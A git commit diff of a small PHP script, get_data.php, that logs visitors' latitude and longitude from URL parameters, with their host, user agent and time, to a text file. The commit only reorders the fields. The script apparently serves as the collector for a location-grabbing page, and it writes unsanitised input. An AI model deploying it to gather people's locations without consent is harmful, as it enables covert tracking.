699fa23e6a0842ad65c9bfbc1d0aa8ede2399251
Tahsin Sayed Nihad <76988233+bug-Nihad@users.noreply.github.com>
2022-11-09 18:59:39 +0600

    Update get_data.php

--- get_data.php
+++ get_data.php
@@ -1,7 +1,7 @@
 <?php
 date_default_timezone_set("Asia/Dhaka");
 $myfile = fopen("data.txt", "a");
-$txt = "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . "\n" . "Host: " . gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" . "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" . "Time: " . date("h:i:sa") . "\n";
+$txt = "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" . "Time: " . date("h:i:sa") . "\n" .  "Host: " . gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" .  "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . "\n\n\n";
 fwrite($myfile, $txt);
 fclose($myfile);
 
